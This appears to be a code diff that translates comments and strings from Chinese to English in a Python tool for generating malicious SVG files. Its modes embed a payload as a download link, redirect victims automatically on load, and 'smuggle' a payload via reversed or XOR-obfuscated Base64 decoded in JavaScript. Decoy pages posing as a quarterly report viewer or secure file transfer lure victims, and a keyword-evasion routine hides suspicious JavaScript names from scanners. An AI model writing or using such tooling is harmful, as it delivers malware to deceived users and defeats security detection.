@@ -5,7 +5,7 @@ from config import OUTPUT_DIR
 
 
 def encode_file_to_base64(file_path):
-    """读取文件并返回 Base64 编码字符串"""
+    """Read file and return Base64-encoded string"""
     with open(file_path, "rb") as f:
         return base64.b64encode(f.read()).decode()
 
@@ -52,10 +52,10 @@ class SVGGenerator:
             svg_content = ""
             
             # Common parameters
-            click_text = params.get('click_text', "安全扫描完成，请点击下载")
+            click_text = params.get('click_text', "Scan complete. Click to download")
             click_text_escaped = html.escape(click_text)
 
-            if "点击下载模式" in mode and "JS" not in mode:
+            if "Click Download" in mode and "JS" not in mode:
                 payload_path = params.get('payload_path')
                 download_filename = params.get('download_filename')
                 image_source = params.get('image_source')
@@ -73,15 +73,15 @@ class SVGGenerator:
                 svg_content = f'''<svg width="100%" height="100%" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice"
      xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
      style="position:fixed;top:0;left:0;">
-  <text x="400" y="50" font-size="24" text-anchor="middle" fill="#333333" font-family="Microsoft YaHei, Arial, sans-serif">{click_text_escaped}</text>
+  <text x="400" y="50" font-size="24" text-anchor="middle" fill="#333333" font-family="Segoe UI, Arial, sans-serif">{click_text_escaped}</text>
   <a href="{payload_data_uri}" download="{download_filename_escaped}">
     <image href="{image_data_uri}" 
          x="100" y="80" width="600" height="400" preserveAspectRatio="xMidYMid meet"/>
-    <text x="400" y="550" font-size="28" text-anchor="middle" fill="#0066cc" text-decoration="underline" font-family="Microsoft YaHei, Arial, sans-serif">点击此处下载文件</text>
+    <text x="400" y="550" font-size="28" text-anchor="middle" fill="#0066cc" text-decoration="underline" font-family="Segoe UI, Arial, sans-serif">Click here to download file</text>
   </a>
 </svg>'''
 
-            elif "URL 跳转模式" in mode:
+            elif "URL Redirect" in mode:
                 target_url = params.get('target_url')
                 image_source = params.get('image_source')
 
@@ -94,15 +94,15 @@ class SVGGenerator:
                 svg_content = f'''<svg width="100%" height="100%" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice"
      xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
      style="position:fixed;top:0;left:0;">
-  <text x="400" y="50" font-size="24" text-anchor="middle" fill="#333333" font-family="Microsoft YaHei, Arial, sans-serif">{click_text_escaped}</text>
+  <text x="400" y="50" font-size="24" text-anchor="middle" fill="#333333" font-family="Segoe UI, Arial, sans-serif">{click_text_escaped}</text>
   <a href="{target_url_escaped}" target="_blank">
     <image href="{image_data_uri}" 
          x="100" y="80" width="600" height="400" preserveAspectRatio="xMidYMid meet"/>
-    <text x="400" y="550" font-size="28" text-anchor="middle" fill="#0066cc" text-decoration="underline" font-family="Microsoft YaHei, Arial, sans-serif">点击此处打开链接</text>
+    <text x="400" y="550" font-size="28" text-anchor="middle" fill="#0066cc" text-decoration="underline" font-family="Segoe UI, Arial, sans-serif">Click here to open link</text>
   </a>
 </svg>'''
 
-            elif "直连跳转模式" in mode:  # Auto Redirect
+            elif "Auto Redirect" in mode:
                 target_url = params.get('target_url')
                 if not target_url:
                     raise ValueError("Target URL is required.")
@@ -113,7 +113,7 @@ class SVGGenerator:
      xmlns="http://www.w3.org/2000/svg"
      style="position:fixed;top:0;left:0;" onload="redirect()">
   <rect width="800" height="600" fill="#f5f5f5"/>
-  <text x="400" y="290" font-size="16" text-anchor="middle" fill="#999" font-family="Microsoft YaHei, Arial, sans-serif">正在跳转，请稍候...</text>
+  <text x="400" y="290" font-size="16" text-anchor="middle" fill="#999" font-family="Segoe UI, Arial, sans-serif">Redirecting, please wait...</text>
   <script type="text/javascript">
     // <![CDATA[
     function redirect() {{
@@ -127,7 +127,7 @@ class SVGGenerator:
 </svg>'''
             
             elif "JS" in mode or "Smuggling" in mode:
-                # SVG JS Smuggling Mode - 独立实现，不依赖 HTMLGenerator
+                # SVG JS Smuggling Mode - standalone implementation
                 payload_path = params.get('payload_path')
                 download_filename = params.get('download_filename')
                 encoding_method = params.get('encoding_method', 'Standard Base64')
@@ -139,11 +139,11 @@ class SVGGenerator:
                 if not download_filename:
                     raise ValueError("Download filename is required.")
 
-                # 读取 payload 并编码
+                # Read payload and encode
                 with open(payload_path, 'rb') as f:
                     payload_data = f.read()
 
-                if encoding_method in ("Reverse + Base64", "反转+Base64"):
+                if encoding_method in ("Reverse + Base64",):
                     reversed_data = payload_data[::-1]
                     encoded_data = base64.b64encode(reversed_data).decode()
                     decoder_js = '''
@@ -154,7 +154,7 @@ class SVGGenerator:
                 arr.reverse();
                 return new Uint8Array(arr);
             }'''
-                elif encoding_method in ("XOR + Base64", "XOR+Base64"):
+                elif encoding_method in ("XOR + Base64",):
                     key = os.urandom(16)
                     key_hex = key.hex()
                     encrypted = bytes([payload_data[i] ^ key[i % len(key)] for i in range(len(payload_data))])
@@ -182,13 +182,13 @@ class SVGGenerator:
 
                 download_name_escaped = html.escape(download_filename)
 
-                # 选择诱饵内容
+                # Select decoy content
                 if decoy_mode == "template2":
                     decoy_svg_content = _get_svg_decoy_template2()
                 else:
                     decoy_svg_content = _get_svg_decoy_template1()
 
-                # 构建 JS 走私代码
+                # Build JS smuggling code
                 smuggling_js = f'''
         (function() {{
             {decoder_js}
@@ -253,111 +253,111 @@ class SVGGenerator:
 
 def _get_svg_decoy_template1():
     """
-    SVG 诱饵模板1：文档预览页面
+    SVG decoy template 1: Document preview page
     """
     return '''
-  <!-- 背景 -->
+  <!-- Background -->
   <rect width="800" height="600" fill="#f5f5f5"/>
   
-  <!-- 顶部栏 -->
+  <!-- Top bar -->
   <rect x="0" y="0" width="800" height="50" fill="#0078d4"/>
-  <text x="20" y="33" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="16" fill="white" font-weight="bold">
-    在线文档查看器
+  <text x="20" y="33" font-family="Segoe UI, Arial, sans-serif" font-size="16" fill="white" font-weight="bold">
+    Online Document Viewer
   </text>
-  <text x="650" y="33" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="12" fill="rgba(255,255,255,0.8)">
-    安全浏览
+  <text x="650" y="33" font-family="Segoe UI, Arial, sans-serif" font-size="12" fill="rgba(255,255,255,0.8)">
+    Secure Browsing
   </text>
   
-  <!-- 文档区域 -->
+  <!-- Document area -->
   <rect x="100" y="70" width="600" height="480" fill="white" rx="4" ry="4"
         style="filter: drop-shadow(0 2px 8px rgba(0,0,0,0.1))"/>
   
-  <!-- 文档内容 -->
-  <text x="140" y="120" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="18" fill="#333" font-weight="bold">
-    季度工作报告
+  <!-- Document content -->
+  <text x="140" y="120" font-family="Segoe UI, Arial, sans-serif" font-size="18" fill="#333" font-weight="bold">
+    Quarterly Business Report
   </text>
   <line x1="140" y1="132" x2="660" y2="132" stroke="#e0e0e0" stroke-width="1"/>
   
-  <text x="140" y="165" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="12" fill="#666">
-    正在为您准备文档下载...
+  <text x="140" y="165" font-family="Segoe UI, Arial, sans-serif" font-size="12" fill="#666">
+    Preparing document for download...
   </text>
-  <text x="140" y="188" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="12" fill="#666">
-    文件处理中，请稍候。
+  <text x="140" y="188" font-family="Segoe UI, Arial, sans-serif" font-size="12" fill="#666">
+    Processing file, please wait.
   </text>
   
-  <!-- 加载动画 -->
+  <!-- Loading animation -->
   <circle cx="400" cy="310" r="22" fill="none" stroke="#0078d4" stroke-width="3" stroke-dasharray="90" stroke-dashoffset="0">
     <animateTransform attributeType="xml" attributeName="transform" type="rotate"
                       from="0 400 310" to="360 400 310" dur="1s" repeatCount="indefinite"/>
   </circle>
-  <text x="400" y="355" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="13" fill="#999" text-anchor="middle">
-    正在加载文档...
+  <text x="400" y="355" font-family="Segoe UI, Arial, sans-serif" font-size="13" fill="#999" text-anchor="middle">
+    Loading document...
   </text>
   
-  <!-- 底部提示 -->
-  <text x="400" y="510" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="11" fill="#999" text-anchor="middle">
-    如果下载没有自动开始，请检查您的浏览器下载设置。
+  <!-- Bottom hint -->
+  <text x="400" y="510" font-family="Segoe UI, Arial, sans-serif" font-size="11" fill="#999" text-anchor="middle">
+    If the download does not start automatically, check your browser download settings.
   </text>
-  <text x="400" y="530" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="10" fill="#bbb" text-anchor="middle">
-    此文件经过加密传输，请妥善保管。
+  <text x="400" y="530" font-family="Segoe UI, Arial, sans-serif" font-size="10" fill="#bbb" text-anchor="middle">
+    This file is transmitted via encrypted channel. Please keep it secure.
   </text>
 '''
 
 
 def _get_svg_decoy_template2():
     """
-    SVG 诱饵模板2：安全文件传输页面
+    SVG decoy template 2: Secure file transfer page
     """
     return '''
-  <!-- 背景 -->
+  <!-- Background -->
   <rect width="800" height="600" fill="#1a1a2e"/>
   
-  <!-- 中央卡片 -->
+  <!-- Center card -->
   <rect x="175" y="100" width="450" height="400" fill="#16213e" rx="12" ry="12"
         style="filter: drop-shadow(0 4px 20px rgba(0,0,0,0.3))"/>
   
-  <!-- 锁图标 -->
+  <!-- Lock icon -->
   <circle cx="400" cy="175" r="32" fill="none" stroke="#e94560" stroke-width="3"/>
   <rect x="383" y="170" width="34" height="28" fill="#e94560" rx="3" ry="3"/>
   <rect x="388" y="152" width="24" height="24" fill="none" stroke="#e94560" stroke-width="3" rx="12" ry="12"/>
   
-  <!-- 标题 -->
-  <text x="400" y="245" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="20" fill="#e0e0e0" 
+  <!-- Title -->
+  <text x="400" y="245" font-family="Segoe UI, Arial, sans-serif" font-size="20" fill="#e0e0e0" 
         text-anchor="middle" font-weight="bold">
-    安全文件传输
+    Secure File Transfer
   </text>
   
-  <!-- 描述 -->
-  <text x="400" y="280" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="13" fill="#a0a0a0" text-anchor="middle">
-    正在为您准备加密文档下载
+  <!-- Description -->
+  <text x="400" y="280" font-family="Segoe UI, Arial, sans-serif" font-size="13" fill="#a0a0a0" text-anchor="middle">
+    Preparing encrypted document for download
   </text>
-  <text x="400" y="302" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="13" fill="#a0a0a0" text-anchor="middle">
-    请稍候，文件正在解密处理中...
+  <text x="400" y="302" font-family="Segoe UI, Arial, sans-serif" font-size="13" fill="#a0a0a0" text-anchor="middle">
+    Please wait, file is being decrypted...
   </text>
   
-  <!-- 进度条 -->
+  <!-- Progress bar -->
   <rect x="240" y="340" width="320" height="8" fill="#0f3460" rx="4" ry="4"/>
   <rect x="240" y="340" width="0" height="8" fill="#e94560" rx="4" ry="4">
     <animate attributeName="width" from="0" to="320" dur="3s" fill="freeze"/>
   </rect>
   
-  <!-- 百分比 -->
-  <text x="400" y="375" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="12" fill="#a0a0a0" text-anchor="middle">
-    解密下载中...
+  <!-- Percentage -->
+  <text x="400" y="375" font-family="Segoe UI, Arial, sans-serif" font-size="12" fill="#a0a0a0" text-anchor="middle">
+    Decrypting and downloading...
   </text>
   
-  <!-- 底部提示 -->
-  <text x="400" y="440" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="11" fill="#666" text-anchor="middle">
-    文件将自动保存到您的下载文件夹
+  <!-- Bottom hint -->
+  <text x="400" y="440" font-family="Segoe UI, Arial, sans-serif" font-size="11" fill="#666" text-anchor="middle">
+    File will be automatically saved to your Downloads folder
   </text>
-  <text x="400" y="462" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="10" fill="#555" text-anchor="middle">
-    本次传输采用端到端加密，请勿截图或转发
+  <text x="400" y="462" font-family="Segoe UI, Arial, sans-serif" font-size="10" fill="#555" text-anchor="middle">
+    End-to-end encrypted transfer. Do not screenshot or forward.
   </text>
 '''
 
 
 def _apply_keyword_evasion_svg(js_code):
-    """对 SVG 中的 JS 代码做关键词规避"""
+    """Apply keyword evasion to JS code in SVG"""
     replacements = {
         'atob': "window[String.fromCharCode(97,116,111,98)]",
         'Blob': "window[String.fromCharCode(66,108,111,98)]",
